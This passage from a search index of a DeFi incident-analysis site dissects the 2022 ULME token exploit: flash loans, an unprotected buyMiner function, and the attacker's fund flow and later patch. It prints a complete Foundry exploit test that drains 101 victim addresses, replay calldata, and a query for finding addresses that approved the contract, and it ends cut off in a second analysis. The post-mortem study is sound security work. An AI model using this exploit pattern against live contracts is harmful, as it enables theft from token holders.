{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<p>Welcome to the DeFiHackAnalysis website! This site contains analyses of past DeFi incidents. You can visit the GitHub for more information.</p> <p>Just analyze for fun! \ud83d\ude00</p>"},{"location":"2022/221025_ULME/","title":"221025-ULME","text":""},{"location":"2022/221025_ULME/#attacktx","title":"AttackTx","text":"<p>Analyzing the attack transaction using Phalcon.</p>"},{"location":"2022/221025_ULME/#fund-flow","title":"Fund Flow","text":"<p>By examining the sequence, it's evident that the attacker first borrowed USDT from 7 DODO pools using flash loans and then returned it after executing other operations (borrowing before repaying). This allowed them to acquire a significant amount of funds required for the attack. The Receiver, in this context, refers to the attacker's contract.</p> <p></p> <p>Subsequently, using the 1000k USDT obtained through flash loans, the attacker exchanged it for approximately 5232k ULME tokens from PancakeSwap pools (8, 12). Finally, they used approximately 4709k ULME tokens to obtain around 1050k USDT (119, 120), resulting in a net profit of approximately 50k USDT.</p> <p>After the attacker obtained ULME tokens, a large number of addresses transferred USDT to the ULME contract (13, 17, 18...). Furthermore, it appears that the ULME contract used these USDT to swap for ULME tokens in the pool (14, 15, 16).</p> <p>Hence, these numerous addresses transferring USDT should be considered victims. The attacker initially accumulated a substantial amount of ULME tokens and then manipulated the victim accounts to use their USDT to purchase ULME tokens, artificially inflating the price and profiting from it.</p> <p>The reason behind this attack may be that the victim accounts had approved the ULME contract for USDT, and the ULME contract contained an external function that allowed the use of authorized addresses to purchase ULME tokens with USDT (access control vulnerability).</p>"},{"location":"2022/221025_ULME/#balance-changes","title":"Balance Changes","text":"<p>The balance changes corroborate the above analysis.</p>"},{"location":"2022/221025_ULME/#state-changes","title":"State Changes","text":"<p>The <code>_allowances</code> for USDT show that these addresses approved a substantial amount for the ULME contract and subsequently decreased the allowances.</p>"},{"location":"2022/221025_ULME/#invocation-flow","title":"Invocation Flow","text":"<p>Next, let's delve into the details of internal calls within the transaction.</p> <p></p> <p>The outermost layer consists of multiple flash loans, borrowing before repaying.</p> <p></p> <p>After borrowing a sufficient amount of USDT, the attacker first exchanged it for a substantial amount of ULME tokens through PancakeRouter. Then, they sequentially retrieved information about the victims' allowances and balances and called the <code>buyMiner</code> function of the ULME contract. (There are approximately 100 victims, suggesting that the attacker had obtained addresses that had previously approved USDT for the ULME contract.)</p> <p></p> <p>Within the <code>buyMiner</code> function, the victim's address transferred USDT to the ULME contract and then used the USDT to exchange for ULME tokens within pools (with a brief detour through address 0x2581, but ultimately, the ULME tokens were not transferred to the victim, which is quite unusual).</p> <p></p> <p>Finally, the attacker converted the ULME tokens back to USDT, realizing their profit, while the victim incurred losses as their USDT was added to the pools to boost the price (and they didn't even receive ULME tokens).</p>"},{"location":"2022/221025_ULME/#vulnerability","title":"Vulnerability","text":"<p>Now, let's analyze the vulnerable ULME contract.</p> <p>From the analysis of the attack transaction, it is clear that the vulnerability lies in the <code>buyMiner</code> function of the contract.</p> <pre><code>function buyMiner(address user, uint256 usdt) public returns (bool) {\n    address[] memory token = new address[](2);\n    token[0] = _usdt_token;\n    token[1] = address(this);\n    usdt = usdt.add(usdt.div(10));\n    require(IERC20(_usdt_token).transferFrom(user, address(this), usdt), \"buyUlm: transferFrom to ulm error\");\n    uint256 time = sale_date;\n    sale_date = 0;\n    address k = 0x25812c28CBC971F7079879a62AaCBC93936784A2;\n    IUniswapV2Router01(_roter).swapExactTokensForTokens(usdt, 1000000, token, k, block.timestamp + 60);\n    IUniswapV2Router01(k).transfer(address(this), address(this), IERC20(address(this)).balanceOf(k));\n    sale_date = time;\n    return true;\n}\n</code></pre> <p>As observed earlier, this function first calls <code>transferFrom</code> to transfer USDT from the <code>user</code> address to this contract (with an amount of <code>1.1*usdt</code>) and then proceeds with the ULME exchange and transfer operations. The visibility of this function is <code>public</code>, enabling anyone to exploit it.</p>"},{"location":"2022/221025_ULME/#exploit","title":"Exploit","text":""},{"location":"2022/221025_ULME/#reproduce","title":"Reproduce","text":"<p>To reproduce the exploit based on AttackTx, the following code can be used.</p> <pre><code>function testExploit() external {\n    uint256 attackBlockNumber = 22476695;\n    vm.rollFork(attackBlockNumber);\n\n    uint256 startBalance = usdt.balanceOf(address(this));\n    emit log_named_decimal_uint(\"Initial attacker USDT\", startBalance, usdt.decimals());\n    uint256 dodo1USDT = usdt.balanceOf(dodo1);\n    // start flashloan\n    IDVM(dodo1).flashLoan(0, dodo1USDT, address(this), abi.encode(\"dodo1\"));\n\n    // attack end\n    uint256 endBalance = usdt.balanceOf(address(this));\n    emit log_named_decimal_uint(\"Total profit USDT\", endBalance - startBalance, usdt.decimals());\n}\n\nfunction dodoCall(address, /*sender*/ uint256, /*baseAmount*/ uint256 quoteAmount, bytes calldata /*data*/ ) internal {\n    if (msg.sender == dodo1) {\n        uint256 dodo2USDT = usdt.balanceOf(dodo2);\n        IDPPAdvanced(dodo2).flashLoan(0, dodo2USDT, address(this), abi.encode(\"dodo2\"));\n        usdt.transfer(dodo1, quoteAmount);\n    } else if (msg.sender == dodo2) {\n        uint256 dodo3USDT = usdt.balanceOf(dodo3);\n        IDPPOracle(dodo3).flashLoan(0, dodo3USDT, address(this), abi.encode(\"dodo3\"));\n        usdt.transfer(dodo2, quoteAmount);\n    } else if (msg.sender == dodo3) {\n        uint256 dodo4USDT = usdt.balanceOf(dodo4);\n        IDPP(dodo4).flashLoan(0, dodo4USDT, address(this), abi.encode(\"dodo4\"));\n        usdt.transfer(dodo3, quoteAmount);\n    } else if (msg.sender == dodo4) {\n        uint256 dodo5USDT = usdt.balanceOf(dodo5);\n        IDPPAdvanced(dodo5).flashLoan(0, dodo5USDT, address(this), abi.encode(\"dodo5\"));\n        usdt.transfer(dodo4, quoteAmount);\n    } else if (msg.sender == dodo5) {\n        uint256 dodo6USDT = usdt.balanceOf(dodo6);\n        IDPPOracle(dodo6).flashLoan(0, dodo6USDT, address(this), abi.encode(\"dodo6\"));\n        usdt.transfer(dodo5, quoteAmount);\n    } else if (msg.sender == dodo6) {\n        uint256 dodo7USDT = usdt.balanceOf(dodo7);\n        IDPPOracle(dodo7).flashLoan(0, dodo7USDT, address(this), abi.encode(\"dodo7\"));\n        usdt.transfer(dodo6, quoteAmount);\n    } else if (msg.sender == dodo7) {\n        // flashloan end, start attack\n        emit log_named_decimal_uint(\"Total borrowed USDT\", usdt.balanceOf(address(this)), usdt.decimals());\n\n        // approve before swap\n        usdt.approve(address(pancakeRouter), type(uint256).max);\n        ulme.approve(address(pancakeRouter), type(uint256).max);\n        USDT2ULME();\n        emit log_named_decimal_uint(\"Total exchanged ULME\", ulme.balanceOf(address(this)), ulme.decimals());\n\n        address[] memory victims = new address[](101);\n        victims[0] = 0x4A005e5E40Ce2B827C873cA37af77e6873e37203;\n        victims[1] = 0x5eCe8A3382FD5317EBa6670cAe2F70ccA8845859;\n        victims[2] = 0x065D5Bfb0bdeAdA1637974F76AcF54428D61c45d;\n        victims[3] = 0x0C678244aaEd33b6c963C2D6B14950d35EAB899F;\n        victims[4] = 0x1F0D9584bC8729Ec139ED5Befe0c8677994FcB35;\n        victims[5] = 0x6b8cdC12e9E2F5b3620FfB12c04C5e7b0990aaf2;\n        victims[6] = 0xA9882080e01F8FD11fa85F05f7c7733D1C9837DF;\n        victims[7] = 0x1dFBBECc9304f73caD14C3785f25C1d1924ACB0B;\n        victims[8] = 0x0b038F3e5454aa745Ff029706656Fed638d5F73a;\n        victims[9] = 0x0Bd084decfb04237E489cAD4c8A559FC5ce44f90;\n        victims[10] = 0x5EB2e4907f796C9879181041fF633F33f8858d93;\n        victims[11] = 0x0DE272Ef3273d49Eb608296A783dBd36488d3989;\n        victims[12] = 0xAe800360ac329ceA761AFDa2d3D55Bd12932Ab62;\n        victims[13] = 0xf7726cA96bF1Cee9c6dC568ad3A801E637d10076;\n        victims[14] = 0x847aA967534C31b47d46A2eEf5832313E36b25E2;\n        victims[15] = 0x6c91DA0Dc1e8ab02Ab1aB8871c5aE312ef04273b;\n        victims[16] = 0xb14018024600eE3c747Be98845c8536994D40A5D;\n        victims[17] = 0x8EcdD8859aA286c6bae1f570eb0105457fD24cd2;\n        victims[18] = 0x6ff1c499C13548ee5C9B1EA6d366A5E11EcA60ca;\n        victims[19] = 0xC02eb88068A40aEe6E4649bDc940e0f792e16C22;\n        victims[20] = 0xa2D5b4de4cb10043D190aae23D1eFC02E31F1Cb6;\n        victims[21] = 0x5E05B8aC4494476Dd539e0F4E1302806ec52ED6F;\n        victims[22] = 0xDeb6FDCa49e54c8b0704C5B3f941ED6319139816;\n        victims[23] = 0x0E6533B8d6937cC8b4c9be31c00acBfaCB6760a5;\n        victims[24] = 0xCE0Fd72a7cF07EB9B20562bbb142Cb711A42867f;\n        victims[25] = 0x4868725bf6D395148def99E6C43074C774e7AC1D;\n        victims[26] = 0x2F1f2BAF34703d16BcfD62cF64A7A5a44Ad6c9d4;\n        victims[27] = 0x3d49Bdf065f009621A02c5Fd88f72ed0A3910521;\n        victims[28] = 0x6E31C08f1938BE5DF98F8968747bB34802D76E50;\n        victims[29] = 0x4F741D8DCDEdd74DadeA6cd3A7e41ECb28076209;\n        victims[30] = 0x5480c14b9841C89527F0D1A55dDC0D273Aae3609;\n        victims[31] = 0xb3725dA113eFFd7F39BE62A5E349f26e82a949fF;\n        victims[32] = 0x9d83Dee089a5fBfB5F2F1268EDB80aeA8Ba5aF16;\n        victims[33] = 0x0c02F3d6962245E934A3fe415EAbA6bf570c1883;\n        victims[34] = 0x0182cfEFB268DD510ee77F32527578BEAC6238e2;\n        victims[35] = 0x78598Ac3943454682477852E846532F73d5cFE5F;\n        victims[36] = 0xd067c7585425e1e5AA98743BdA5fB65212751476;\n        victims[37] = 0x3507ddF8b74dAEd03fE76EE74B7d6544F3B254B7;\n        victims[38] = 0xEca4Fd6b05E5849aAf5F2bEE5Eb3B50f8C4f4E3c;\n        victims[39] = 0xAA279af072080f3e453A916b77862b4ff6eB245E;\n        victims[40] = 0x4e505a21325A6820E2099Bbd15f6832c6f696a3c;\n        victims[41] = 0xA5b63F7b40A5Cc5ee6B9dB7cef2415699627Ee89;\n        victims[42] = 0x3dd624cEd432DDc32fA0afDaE855b76aa1431644;\n        victims[43] = 0x17f217Fdeff7Ee4a81a4b2f42c695EDC20806957;\n        victims[44] = 0x41819F36878d15A776225928CD52DC56acCFD553;\n        victims[45] = 0x61ca76703C5aF052c9b0aCc2Bab0276875DDd328;\n        victims[46] = 0x2956bCc87450B424C7305C4c6CF771196c23A52E;\n        victims[47] = 0x03be05224803c89f3b8C806d887fD84A20D16e5C;\n        victims[48] = 0x3C97320bf030C2c120FdCe19023A571f3fbB6184;\n        victims[49] = 0xc52021150ca5c32253220bE328ddC05F86d3a619;\n        victims[50] = 0x6d7aAa35c4B2dBD6F1E979e04884AeE1B4FBB407;\n        victims[51] = 0x7c80162197607312EC99d7c9e34720B3572d6D16;\n        victims[52] = 0x15D92C909826017Ff0184eea3e38c36489517A7C;\n        victims[53] = 0xC07fa7a1F14A374d169Dc593261843B4A6d9C1C3;\n        victims[54] = 0x4b415F48FA70a9a0050F6380e843790260973808;\n        victims[55] = 0x9CeEeB927b85d4bD3b4e282c17EB186bCDC4Dd15;\n        victims[56] = 0x0eb76DAf60bdF637FC207BFb545B546D5Ee208B1;\n        victims[57] = 0x96D7F1660e708eDdF2b6f655ADB61686B59bC190;\n        victims[58] = 0xDCeB637E38dBae685222eEf6635095AaaEC65496;\n        victims[59] = 0x36083Aac533353317C24Bd53227DbF29Ed9F384c;\n        victims[60] = 0x94913f31fBaFcb0ae6e5EfA4C18E3ee301097eab;\n        victims[61] = 0x188c50F43f9fA0026BAaa7d8cF83c358311f0500;\n        victims[62] = 0x3d8dcC70777643612564D84176f769A1417987a5;\n        victims[63] = 0x00273CEEe956543c801429A886cD0E1a79f5d8cA;\n        victims[64] = 0xC43C5F785D06b582E3E710Dc0156267Fd135C602;\n        victims[65] = 0x0406aefd83f20700D31a49F3d6fdbF52e8F7D0Ef;\n        victims[66] = 0xBeD8C7433dE90D349f96C6AE82d4eb4482AA6Bf7;\n        victims[67] = 0xDe436F7742cE08f843f8d84e7998E0B7e4b73101;\n        victims[68] = 0xd38c6E26aa4888DE59C2EAaD6138B0b66ABBF21D;\n        victims[69] = 0xc0dFb3219F0C72E902544a080ba0086da53F9599;\n        victims[70] = 0xFAAD61bd6b509145c2988B03529fF21F3C9970B2;\n        victims[71] = 0x9f9BEEF87Cfe141868E21EacbDDB48DF6c54C2F2;\n        victims[72] = 0x6614e2e86b4646793714B1fa535fc5875bB446d5;\n        victims[73] = 0x7eFe3780b1b0cde8F300443fbb4C12a73904a948;\n        victims[74] = 0xAd813b95A27233E7Abd92C62bBa87f59Ca8F9339;\n        victims[75] = 0x13F33854cE08e07D20F5C0B16884267dde21a501;\n        victims[76] = 0x59ebcde7Ec542b5198095917987755727725fD1d;\n        victims[77] = 0xe5A5B86119BD9fd4DF5478AbE1d3D9F46BF3Ba5F;\n        victims[78] = 0xC2724ed2B629290787Eb4A91f00aAFE58F262025;\n        victims[79] = 0xDFa225eB03F9cc2514361A044EDDA777eA51b9ad;\n        victims[80] = 0x85d981E3CDdb402F9Ae96948900971102Ee5d6b5;\n        victims[81] = 0xb0Ac3A88bFc919cA189f7d4AbA8e2F191b37A65B;\n        victims[82] = 0x1A906A9A385132D6B1a62Bb8547fD20c38dd79Bb;\n        victims[83] = 0x9d36C7c400e033aeAc391b24F47339d7CB7bc033;\n        victims[84] = 0x5B19C1F57b227C67Bef1e77b1B6796eF22aEe21B;\n        victims[85] = 0xbfd0785a924c3547544C95913dAC0b119865DF9e;\n        victims[86] = 0xF003E6430fbC1194ffA3419629A389B7C113F083;\n        victims[87] = 0xfa30Cd705eE0908e2Dac4C19575F824DED99818E;\n        victims[88] = 0xe27027B827FE2FBcFCb56269d4463881AA6B8955;\n        victims[89] = 0xEddD7179E461F42149104DCb87F3b5b657a05399;\n        victims[90] = 0x980FcDB646c674FF9B6621902aCB8a4012974093;\n        victims[91] = 0x2eBc77934935980357A894577c2CC7107574f971;\n        victims[92] = 0x798435DE8fA75993bFC9aD84465d7F812507b604;\n        victims[93] = 0x1Be117F424e9e6f845F7b07C072c1d67F114f885;\n        victims[94] = 0x434e921bDFe74605BD2AAbC2f6389dDBA2d37ACA;\n        victims[95] = 0xaFacAc64426D1cE0512363338066cc8cABB3AEa2;\n        victims[96] = 0x2693e0A37Ea6e669aB43dF6ee68b453F6D6F3EBD;\n        victims[97] = 0x77Aee2AAc9881F4A4C347eb94dEd088aD49C574D;\n        victims[98] = 0x951f4785A2A61fe8934393e0ff6513D6946D8d97;\n        victims[99] = 0x2051cE514801167545E74b5DD2a8cF5034c6b17b;\n        victims[100] = 0xC2EE820756d4074d887d762Fd8F70c4Fc47Ab47f;\n\n        uint256 loss = 0;\n        // start exploit buyMiner function\n        for (uint256 i; i &lt; victims.length; i++) {\n            address victim = victims[i];\n            uint256 allowance = usdt.allowance(victim, address(ulme));\n            uint256 balance = usdt.balanceOf(victim);\n            uint256 available = balance &lt;= allowance ? balance : allowance; // available USDT\n\n            if (available &gt; 0) {\n                uint256 amount = available * 10 / 11; // according to the buyMiner function, *10/11 to drain all USDT\n                ulme.buyMiner(victim, amount);\n                loss += available;\n            } else {\n                emit log_named_address(\"Insufficient USDT\", victim);\n            }\n        }\n        emit log_named_decimal_uint(\"Total loss USDT\", loss, usdt.decimals());\n\n        ULME2USDT();\n\n        usdt.transfer(dodo7, quoteAmount);\n    }\n}\n\nfunction DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n    dodoCall(sender, baseAmount, quoteAmount, data);\n}\n\nfunction DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n    dodoCall(sender, baseAmount, quoteAmount, data);\n}\n\nfunction USDT2ULME() internal {\n    address[] memory path = new address[](2);\n    path[0] = address(usdt);\n    path[1] = address(ulme);\n    pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        1_000_000 ether, 0, path, address(this), block.timestamp\n    );\n}\n\nfunction ULME2USDT() internal {\n    address[] memory path = new address[](2);\n    path[0] = address(ulme);\n    path[1] = address(usdt);\n    pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( // ULME token has transfer fees\n        ulme.balanceOf(address(this)) - 100, // can not swap all, according to the transactionFee function\n        0,\n        path,\n        address(this),\n        block.timestamp\n    );\n}\n</code></pre> <p>Initially, a significant amount of USDT was flashloaned from seven DODO pools. Subsequently, the attacker exchanged the borrowed USDT for approximately 5232k ULME tokens from PancakeSwap pools. Then, they used the vulnerable <code>buyMiner</code> function to exchange victim's USDT for ULME tokens, artificially inflating the price. Finally, the attacker converted ULME tokens back to USDT, repaying the borrowed funds, resulting in a profit of approximately 50k USDT.</p> <p>A few important points to note include the following logic from the <code>buyMiner</code> function:</p> <pre><code>usdt = usdt.add(usdt.div(10));\nrequire(IERC20(_usdt_token).transferFrom(user, address(this), usdt), \"buyUlm: transferFrom to ulm error\");\n</code></pre> <p>To use all of the victim's USDT for ULME token exchange, the parameter passed should be <code>available*10/11</code>. In the <code>buyMiner</code> function, this is adjusted again by <code>*11/10</code> to fully utilize the USDT.</p> <p>In the ULME contract's <code>_transfer</code> function, it first calls the <code>transactionFee</code> function, indicating that there is a transaction fee for ULME contract transfers. Therefore, when exchanging USDT for ULME, the PancakeRouter's <code>swapExactTokensForTokensSupportingFeeOnTransferTokens</code> function should be used.</p> <pre><code>function _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal {\n    amount = transactionFee(from, to, amount);\n    super._transfer(from, to, amount);\n}\n</code></pre> <p>Additionally, within the <code>transactionFee</code> function, there is the following code:</p> <pre><code>require(balanceOf(from) &gt; amount, \"balanceOf is Insufficient\");\n</code></pre> <p>Therefore, the amount of ULME tokens passed in the exchange should not deplete the entire balance.</p>"},{"location":"2022/221025_ULME/#attack-flow","title":"Attack Flow","text":"<p>Analyzing the entire attack flow for the attacker's address.</p> <p></p> <p>First, on October 25th, at approximately 8:12 AM, the attacker used Tornado Cash to deposit 1 BNB as initial capital for the attack. </p> <p>About 5 minutes later, the attacker created the attack contract used for the exploit.</p> <p></p> <p>Two minutes after that, the attacker called the deployed attack contract to initiate the attack. Subsequently, they exchanged the obtained USDT for approximately 184 BNB and, in the end, withdrew the funds using Tornado Cash, completing the entire attack process.</p>"},{"location":"2022/221025_ULME/#misc","title":"Misc","text":""},{"location":"2022/221025_ULME/#ulme-token","title":"ULME Token","text":"<p>Regarding the vulnerable ULME token, apart from this attack, there doesn't seem to be much information available.</p> <p>The transaction creating the token contract has <code>msg.sender</code> as 0x4A005e5E40Ce2B827C873cA37af77e6873e37203, and the <code>dis</code> parameter is a contract address. In block 22314002, the token contract creator sent a transaction that called the <code>dis</code> contract and set variables like <code>roter</code>, <code>sell</code>, and <code>usdt_token</code>.</p> <p>Upon closer examination of related contracts, some have Chinese comments, suggesting that this might be a project from China. It's not entirely clear, and there could be many tokens associated with these addresses.</p>"},{"location":"2022/221025_ULME/#victims","title":"Victims","text":"<p>An important condition for this attack was the need to obtain many addresses that had approved the vulnerable contract for spending their USDT (victims). Websites like Etherscan only provide functionality for checking Token Approval for a specific address. It is speculated that the attacker might have used tools like Dune Analytics or nodes to query approval data.</p> <p>For example, using the following SQL query in Dune Analytics, it is possible to retrieve the most recent 100 addresses that approved the ULME contract to spend their USDT:</p> <pre><code>SELECT\n  evt_block_time AS timestamp,\n  evt_tx_hash AS transaction_hash,\n  owner AS owner,\n  spender AS spender\nFROM bep20usdt_bnb.BEP20USDT_evt_Approval\nWHERE\n  spender = 0xAE975a25646E6eB859615d0A147B909c13D31FEd\nORDER BY evt_block_time DESC\nLIMIT 100;\n</code></pre>"},{"location":"2022/221025_ULME/#frontrunning-protection","title":"Frontrunning Protection","text":"<p>Typically, attack contracts include code to prevent frontrunning.</p> <p>As observed in AttackTx, it appears that the first step after calling the attack contract is signature verification, likely implemented to prevent frontrunning.</p> <p></p> <p>Upon decompilation, a detailed analysis of the attack contract deployed by the attacker can be seen.</p> <p>It verifies the signature passed as a parameter and requires it to match <code>msg.sender</code>, making it difficult to directly replay the attack by simply copying the parameters. A replay would require generating a new signature.</p> <p></p> <pre><code>function testFrontrun() external {\n    uint256 attackBlockNumber = 22476695;\n    address attackContract = 0x8523C7661850D0Da4D86587ce9674DA23369fF26;\n    address attacker = 0x056c20Ab7E25e4dd7E49568f964d98E415da63D3;\n    vm.rollFork(attackBlockNumber);\n    vm.startPrank(attacker);\n    uint256 balance0 = usdt.balanceOf(attacker);\n    bytes memory data =\n        hex\"016ccafe00000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000f424000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000d60000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000650000000000000000000000004a005e5e40ce2b827c873ca37af77e6873e372030000000000000000000000005ece8a3382fd5317eba6670cae2f70cca8845859000000000000000000000000065d5bfb0bdeada1637974f76acf54428d61c45d0000000000000000000000000c678244aaed33b6c963c2d6b14950d35eab899f0000000000000000000000001f0d9584bc8729ec139ed5befe0c8677994fcb350000000000000000000000006b8cdc12e9e2f5b3620ffb12c04c5e7b0990aaf2000000000000000000000000a9882080e01f8fd11fa85f05f7c7733d1c9837df0000000000000000000000001dfbbecc9304f73cad14c3785f25c1d1924acb0b0000000000000000000000000b038f3e5454aa745ff029706656fed638d5f73a0000000000000000000000000bd084decfb04237e489cad4c8a559fc5ce44f900000000000000000000000005eb2e4907f796c9879181041ff633f33f8858d930000000000000000000000000de272ef3273d49eb608296a783dbd36488d3989000000000000000000000000ae800360ac329cea761afda2d3d55bd12932ab62000000000000000000000000f7726ca96bf1cee9c6dc568ad3a801e637d10076000000000000000000000000847aa967534c31b47d46a2eef5832313e36b25e20000000000000000000000006c91da0dc1e8ab02ab1ab8871c5ae312ef04273b000000000000000000000000b14018024600ee3c747be98845c8536994d40a5d0000000000000000000000008ecdd8859aa286c6bae1f570eb0105457fd24cd20000000000000000000000006ff1c499c13548ee5c9b1ea6d366a5e11eca60ca000000000000000000000000c02eb88068a40aee6e4649bdc940e0f792e16c22000000000000000000000000a2d5b4de4cb10043d190aae23d1efc02e31f1cb60000000000000000000000005e05b8ac4494476dd539e0f4e1302806ec52ed6f000000000000000000000000deb6fdca49e54c8b0704c5b3f941ed63191398160000000000000000000000000e6533b8d6937cc8b4c9be31c00acbfacb6760a5000000000000000000000000ce0fd72a7cf07eb9b20562bbb142cb711a42867f0000000000000000000000004868725bf6d395148def99e6c43074c774e7ac1d0000000000000000000000002f1f2baf34703d16bcfd62cf64a7a5a44ad6c9d40000000000000000000000003d49bdf065f009621a02c5fd88f72ed0a39105210000000000000000000000006e31c08f1938be5df98f8968747bb34802d76e500000000000000000000000004f741d8dcdedd74dadea6cd3a7e41ecb280762090000000000000000000000005480c14b9841c89527f0d1a55ddc0d273aae3609000000000000000000000000b3725da113effd7f39be62a5e349f26e82a949ff0000000000000000000000009d83dee089a5fbfb5f2f1268edb80aea8ba5af160000000000000000000000000c02f3d6962245e934a3fe415eaba6bf570c18830000000000000000000000000182cfefb268dd510ee77f32527578beac6238e200000000000000000000000078598ac3943454682477852e846532f73d5cfe5f000000000000000000000000d067c7585425e1e5aa98743bda5fb652127514760000000000000000000000003507ddf8b74daed03fe76ee74b7d6544f3b254b7000000000000000000000000eca4fd6b05e5849aaf5f2bee5eb3b50f8c4f4e3c000000000000000000000000aa279af072080f3e453a916b77862b4ff6eb245e0000000000000000000000004e505a21325a6820e2099bbd15f6832c6f696a3c000000000000000000000000a5b63f7b40a5cc5ee6b9db7cef2415699627ee890000000000000000000000003dd624ced432ddc32fa0afdae855b76aa143164400000000000000000000000017f217fdeff7ee4a81a4b2f42c695edc2080695700000000000000000000000041819f36878d15a776225928cd52dc56accfd55300000000000000000000000061ca76703c5af052c9b0acc2bab0276875ddd3280000000000000000000000002956bcc87450b424c7305c4c6cf771196c23a52e00000000000000000000000003be05224803c89f3b8c806d887fd84a20d16e5c0000000000000000000000003c97320bf030c2c120fdce19023a571f3fbb6184000000000000000000000000c52021150ca5c32253220be328ddc05f86d3a6190000000000000000000000006d7aaa35c4b2dbd6f1e979e04884aee1b4fbb4070000000000000000000000007c80162197607312ec99d7c9e34720b3572d6d1600000000000000000000000015d92c909826017ff0184eea3e38c36489517a7c000000000000000000000000c07fa7a1f14a374d169dc593261843b4a6d9c1c30000000000000000000000004b415f48fa70a9a0050f6380e8437902609738080000000000000000000000009ceeeb927b85d4bd3b4e282c17eb186bcdc4dd150000000000000000000000000eb76daf60bdf637fc207bfb545b546d5ee208b100000000000000000000000096d7f1660e708eddf2b6f655adb61686b59bc190000000000000000000000000dceb637e38dbae685222eef6635095aaaec6549600000000000000000000000036083aac533353317c24bd53227dbf29ed9f384c00000000000000000000000094913f31fbafcb0ae6e5efa4c18e3ee301097eab000000000000000000000000188c50f43f9fa0026baaa7d8cf83c358311f05000000000000000000000000003d8dcc70777643612564d84176f769a1417987a500000000000000000000000000273ceee956543c801429a886cd0e1a79f5d8ca000000000000000000000000c43c5f785d06b582e3e710dc0156267fd135c6020000000000000000000000000406aefd83f20700d31a49f3d6fdbf52e8f7d0ef000000000000000000000000bed8c7433de90d349f96c6ae82d4eb4482aa6bf7000000000000000000000000de436f7742ce08f843f8d84e7998e0b7e4b73101000000000000000000000000d38c6e26aa4888de59c2eaad6138b0b66abbf21d000000000000000000000000c0dfb3219f0c72e902544a080ba0086da53f9599000000000000000000000000faad61bd6b509145c2988b03529ff21f3c9970b20000000000000000000000009f9beef87cfe141868e21eacbddb48df6c54c2f20000000000000000000000006614e2e86b4646793714b1fa535fc5875bb446d50000000000000000000000007efe3780b1b0cde8f300443fbb4c12a73904a948000000000000000000000000ad813b95a27233e7abd92c62bba87f59ca8f933900000000000000000000000013f33854ce08e07d20f5c0b16884267dde21a50100000000000000000000000059ebcde7ec542b5198095917987755727725fd1d000000000000000000000000e5a5b86119bd9fd4df5478abe1d3d9f46bf3ba5f000000000000000000000000c2724ed2b629290787eb4a91f00aafe58f262025000000000000000000000000dfa225eb03f9cc2514361a044edda777ea51b9ad00000000000000000000000085d981e3cddb402f9ae96948900971102ee5d6b5000000000000000000000000b0ac3a88bfc919ca189f7d4aba8e2f191b37a65b0000000000000000000000001a906a9a385132d6b1a62bb8547fd20c38dd79bb0000000000000000000000009d36c7c400e033aeac391b24f47339d7cb7bc0330000000000000000000000005b19c1f57b227c67bef1e77b1b6796ef22aee21b000000000000000000000000bfd0785a924c3547544c95913dac0b119865df9e000000000000000000000000f003e6430fbc1194ffa3419629a389b7c113f083000000000000000000000000fa30cd705ee0908e2dac4c19575f824ded99818e000000000000000000000000e27027b827fe2fbcfcb56269d4463881aa6b8955000000000000000000000000eddd7179e461f42149104dcb87f3b5b657a05399000000000000000000000000980fcdb646c674ff9b6621902acb8a40129740930000000000000000000000002ebc77934935980357a894577c2cc7107574f971000000000000000000000000798435de8fa75993bfc9ad84465d7f812507b6040000000000000000000000001be117f424e9e6f845f7b07c072c1d67f114f885000000000000000000000000434e921bdfe74605bd2aabc2f6389ddba2d37aca000000000000000000000000afacac64426d1ce0512363338066cc8cabb3aea20000000000000000000000002693e0a37ea6e669ab43df6ee68b453f6d6f3ebd00000000000000000000000077aee2aac9881f4a4c347eb94ded088ad49c574d000000000000000000000000951f4785a2a61fe8934393e0ff6513d6946d8d970000000000000000000000002051ce514801167545e74b5dd2a8cf5034c6b17b000000000000000000000000c2ee820756d4074d887d762fd8f70c4fc47ab47f00000000000000000000000000000000000000000000000000000000000000412205f5d1bca99609787803dd8694d8acf0bcb45f62c338300ad96faaca07491403e7612cf8cb1a59e0785f9d3cf2f5fc1e422c5f1afa9a908adea1e47f70fe481b00000000000000000000000000000000000000000000000000000000000000\";\n    (bool success,) = attackContract.call(data);\n    require(success, \"frontrun failed\");\n    emit log_named_decimal_uint(\"Totol profit\", usdt.balanceOf(attacker) - balance0, usdt.decimals());\n    vm.stopPrank();\n}\n</code></pre> <p>However, using the above code for testing, it can still be easily detected as profitable by bots.</p> <p>After the AttackTx, subsequent another call to the attack contract were also made, but it resulted in reverts due to signature verification failures, indicating an attempt to replay the attack (though it was too late, as the vulnerability had already been \"fixed\").</p> <p></p>"},{"location":"2022/221025_ULME/#patch","title":"Patch","text":"<p>The token contract is not a proxy contract, but it appears that people are still trading it to this day, indicating that the vulnerability has likely been fixed. However, it's clear that the <code>buyMiner</code> function cannot be altered and can still be called by anyone.</p> <p>Attempting to call the <code>buyMiner</code> function after the most recent blockchain fork results in a revert.</p> <p></p> <p>The original <code>transferFrom</code> should have transferred USDT from the specified address to the ULME contract. However, it is evident that the USDT contract address has been changed. Checking this 0xE2Df address reveals that the contract was created by the owner approximately 4 hours after the attack occurred.</p> <p></p> <p>Upon decompilation, it is evident that this contract does not provide the <code>transferFrom</code> function. Consequently, calling the <code>buyMiner</code> function will result in a revert, rendering the vulnerability function unusable.</p> <p></p> <p>The patch transaction can be seen below.</p> <p></p> <p></p>"},{"location":"2022/221129_MBC/","title":"221129-MBC-ZZSH","text":""},{"location":"2022/221129_MBC/#attacktx","title":"AttackTx","text":"<p>Analyzing the attack transaction using Phalcon.</p>"},{"location":"2022/221129_MBC/#fund-flow","title":"Fund Flow","text":"<p>The attacker initially borrowed around 800k USDT from the DODO pool for the subsequent attack. </p> <p>The main focus then shifted to two tokens, MBC and ZZSH, with a similar overall logic.</p> <p></p> <p>The attacker used 150k USDT in the Pancake pool to exchange for approximately 10k MBC (2, 6). This involved some transaction fees and burning operations (3, 4, 5). Eventually, the 